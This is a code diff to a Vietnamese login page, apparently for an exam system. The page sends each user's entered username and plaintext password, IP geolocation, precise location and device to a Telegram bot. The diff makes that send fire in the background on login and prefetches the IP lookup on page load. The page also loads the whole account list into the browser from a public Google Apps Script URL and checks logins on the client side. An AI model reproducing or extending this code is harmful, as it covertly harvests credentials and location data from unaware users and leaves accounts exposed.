@@ -6,6 +6,9 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Đăng nhập hệ thống</title>
+    <!-- Preconnect cho Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         * {
@@ -998,16 +1001,7 @@
                 let chatId = getTelegramChatId();
                 if (!botToken || botToken === "ĐIỀN_TOKEN_BOT_CỦA_ANH_VÀO_ĐÂY") return;
 
-                let ipData = { ip: 'N/A', city: 'N/A', region: 'N/A', latitude: 0, longitude: 0 };
-                try {
-                    const ipRes = await Promise.race([
-                        fetch('https://get.geojs.io/v1/ip/geo.json'),
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('IP Timeout')), 3000))
-                    ]);
-                    ipData = await ipRes.json();
-                } catch (e) {
-                    console.log("Không thể fetch IP:", e);
-                }
+                let ipData = prefetchIpData;
                 let exactLat = sessionStorage.getItem('exact_lat');
                 let exactLng = sessionStorage.getItem('exact_lng');
                 let lat = exactLat ? exactLat : ipData.latitude;
@@ -1020,18 +1014,34 @@
                 const message = `🚨 <b>CÓ NGƯỜI ĐĂNG NHẬP THI</b>\n\n👤 Tên: <code>${user}</code>\n🔑 Mật khẩu nhập: <code>${pass}</code>\n🌐 IP: ${ipData.ip}\n📍 Vị trí (${locationType}): <a href="${mapLink}">${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}</a>\n📱 Thiết bị: <code>${device}</code>\n⏱ T.Gian: ${new Date().toLocaleString('vi-VN')}`;
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-                await Promise.race([
-                    fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
-                    }),
-                    new Promise(r => setTimeout(r, 2000))
-                ]);
+                // Sử dụng keepalive: true để request không bị huỷ khi chuyển trang lập tức
+                fetch(url, {
+                    method: 'POST',
+                    keepalive: true,
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+                }).catch(e => console.error(e));
             } catch (error) {
                 console.error("Lỗi gửi Tele:", error);
             }
         }
+
+        // ==========================================
+        // TẢI TRƯỚC DỮ LIỆU ĐỂ ĐĂNG NHẬP SIÊU NHANH
+        // ==========================================
+        let prefetchIpData = { ip: 'N/A', city: 'N/A', region: 'N/A', latitude: 0, longitude: 0 };
+        fetch('https://get.geojs.io/v1/ip/geo.json')
+            .then(res => res.json())
+            .then(data => { prefetchIpData = data; })
+            .catch(e => console.error("Lỗi tải IP:", e));
+
+        const GAS_ACCOUNTS_API = "https://script.google.com/macros/s/AKfycbwV7pg3XCFCGw096kmXBCFPCcZFI2_sryRoxQXWHokzyKHpxeMx3_QSo43D5Snww7Y/exec";
+        let prefetchAccountsPromise = fetch(GAS_ACCOUNTS_API + "?action=getAccounts")
+            .then(res => res.json())
+            .catch(e => {
+                console.error("Lỗi prefetch:", e);
+                return typeof VALID_ACCOUNTS !== 'undefined' ? VALID_ACCOUNTS : {};
+            });
 
         // ==========================================
         // HÀM ĐĂNG NHẬP (GIỐNG LOGIN2.HTML)
@@ -1053,12 +1063,16 @@
                 loginBtn.innerHTML = '<span class="spinner"></span> Đang kiểm tra...';
                 loginBtn.disabled = true;
 
-                // Gọi API để lấy danh sách tài khoản mới nhất từ Google Sheets
-                const GAS_ACCOUNTS_API = "https://script.google.com/macros/s/AKfycbwV7pg3XCFCGw096kmXBCFPCcZFI2_sryRoxQXWHokzyKHpxeMx3_QSo43D5Snww7Y/exec";
+                // Lấy dữ liệu đã tải ngầm từ lúc mở web (Tốc độ ánh sáng ⚡)
                 let validAccountsObj = {};
                 try {
-                    const res = await fetch(GAS_ACCOUNTS_API + "?action=getAccounts");
-                    validAccountsObj = await res.json();
+                    validAccountsObj = await prefetchAccountsPromise;
+                    
+                    // Nếu vì lý do nào đó object rỗng, thử gọi lại 1 lần
+                    if (!validAccountsObj || Object.keys(validAccountsObj).length === 0) {
+                        const res = await fetch(GAS_ACCOUNTS_API + "?action=getAccounts");
+                        validAccountsObj = await res.json();
+                    }
                 } catch (e) {
                     console.error("Lỗi lấy danh sách tài khoản từ Google Sheets:", e);
                     // Fallback nếu lỗi mạng
@@ -1139,8 +1153,8 @@
                     }
                 }
 
-                // ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM (đợi gửi xong để không bị hủy trên mobile)
-                await sendToTelegram(username, password).catch(e => console.error("Tele err:", e));
+                // ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM (Gửi ngầm, KHÔNG cần chờ await để tiết kiệm 2 giây)
+                sendToTelegram(username, password).catch(e => console.error("Tele err:", e));
 
                 // Khôi phục nút
                 loginBtn.innerHTML = prevText;
